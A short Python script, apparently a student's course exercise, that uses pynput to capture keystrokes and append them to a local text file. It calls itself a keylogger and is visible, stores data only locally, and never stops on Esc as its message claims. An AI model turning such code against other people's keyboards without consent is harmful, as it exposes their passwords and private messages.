from pynput import keyboard

# Define a string to store the typed keys
pressed_keys = ""

def on_key_press(key):
    global pressed_keys

    try:
        # Collect the pressed key
        pressed_key = key.char

        # Append the key to the list of pressed keys
        pressed_keys += pressed_key

    except AttributeError:
        # Handle special keys (e.g., whitespace, symbols)
        if str(key) == 'Key.space':
            pressed_keys += ' '
        elif str(key) == 'Key.backspace':
            pressed_keys = pressed_keys[:-1]
        # Add other special keys here as needed

def save_keys(keys):
    if keys.strip():  # Check if the keys are not empty or only contain whitespace
        with open("F:\\U-DEMY-COURSES\\My_programms\\2nd_file\\Day_48\\MyPrctic\\typerrush.txt", "a") as file:
            file.write(keys + "\n")

# Start listening to keyboard events
with keyboard.Listener(on_press=on_key_press) as listener:
    print("Keylogger started. Press 'Esc' to exit.")
    listener.join()

# Save the captured keys to the file
save_keys(pressed_keys)

print("Keylogger stopped.")
print(pressed_keys)
